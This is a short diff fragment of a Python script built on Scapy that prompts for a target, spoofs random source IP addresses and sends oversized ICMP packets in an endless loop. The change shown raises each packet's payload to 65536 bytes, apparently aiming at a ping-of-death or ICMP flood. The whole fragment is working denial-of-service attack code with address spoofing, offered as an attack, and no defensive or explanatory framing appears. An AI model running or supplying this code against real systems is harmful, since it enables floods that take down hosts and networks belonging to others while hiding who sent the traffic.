@@ -19,5 +19,5 @@ target = raw_input("Enter the target to attack: ")
 while True:
     rand_addr = address_spoofer()
     ip_hdr = IP(src=rand_addr, dst=target)
-    packet = ip_hdr / ICMP() / ("m" * 60000)  # send 60k bytes of junk
+    packet = ip_hdr / ICMP() / ("Y" * 65536)  # 65536 bytes
     send(packet)
